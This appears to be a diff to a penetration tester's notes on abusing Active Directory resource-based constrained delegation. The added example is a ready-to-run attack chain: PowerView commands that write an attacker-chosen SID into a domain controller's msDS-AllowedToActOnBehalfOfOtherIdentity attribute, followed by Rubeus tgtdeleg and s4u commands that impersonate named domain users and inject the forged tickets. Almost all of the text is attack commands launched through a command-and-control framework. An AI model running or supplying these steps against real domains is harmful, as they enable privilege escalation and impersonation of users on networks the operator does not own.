@@ -34,10 +34,22 @@ Requirements:
     userAccountControl=TrustedToAuthForDelegation (Only required for remote host with SPN)
     msDS-AllowedToActOnBehalfOfOtherIdentity
         * If write perms: set msDS-AllowedToActOnBehalfOfOtherIdentity to resource (computer/user that has an SPN)
-            *Use PowerMad to set the security descriptors and the SID from the resource above
+            *Use PowerView to set the security descriptors and the SID from the resource above
         * If you do not have a resource you can try Machine Quota and create a new machine using PowerMad
             * Powerview display ms-ds-machinecountquota: Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local
 Add SID of resource above to ActOnBehalfOfOtherIdentity attribute
+
+Example: (put in one liner)
+         (Set Security Descriptor to user (that has SPN) with GenericWrite Perms)
+         Import PowerView
+         powerpick $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$('S-1-5-21-340507432-2615605230-720798708-1293'))"
+         $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0)
+         Get-DomainComputer m3dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+         
+         (Impersonate User with Rubeus)
+         execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe tgtdeleg /nowrap
+         execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /ticket:doIFFDCCBRCg......lNM0MuTE9DQUw= 
+         /impersonateuser:kenneth.kea /domain:m3c.local /msdsspn:cifs/m3dc.m3c.local /altservice:ldap /ptt
 --------------------------------------------------------------------------------------------------
 S4U Impersonation Commands
         Ticket: execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /ticket:doIE9j...TE9DQUw= /impersonateuser:DAVID.GAINES /domain:m3c.local /msdsspn:"time/m3webaw.m3c.local" /altservice:wsman /altservice:host /altservice:http /ptt
